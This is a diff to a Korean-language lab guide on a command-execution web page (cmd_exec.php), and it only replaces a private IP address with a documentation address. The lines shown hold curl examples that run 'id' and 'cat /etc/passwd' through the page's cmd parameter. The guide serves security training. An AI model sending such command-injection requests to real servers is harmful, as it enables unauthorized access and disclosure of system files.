@@ -67,7 +67,7 @@ echo "<pre>$output</pre>";
 ### 실습 URL
 
 ```
-http://10.200.101.182/cmd_exec.php
+http://192.0.2.182/cmd_exec.php
 ```
 
 ### 테스트 입력
@@ -86,10 +86,10 @@ http://10.200.101.182/cmd_exec.php
 
 ```bash
 # GET 방식
-curl "http://10.200.101.182/cmd_exec.php?cmd=id"
+curl "http://192.0.2.182/cmd_exec.php?cmd=id"
 
 # POST 방식
-curl -X POST -d "cmd=cat /etc/passwd" http://10.200.101.182/cmd_exec.php
+curl -X POST -d "cmd=cat /etc/passwd" http://192.0.2.182/cmd_exec.php
 ```
 
 [⬆ 목차로 돌아가기](#목차)
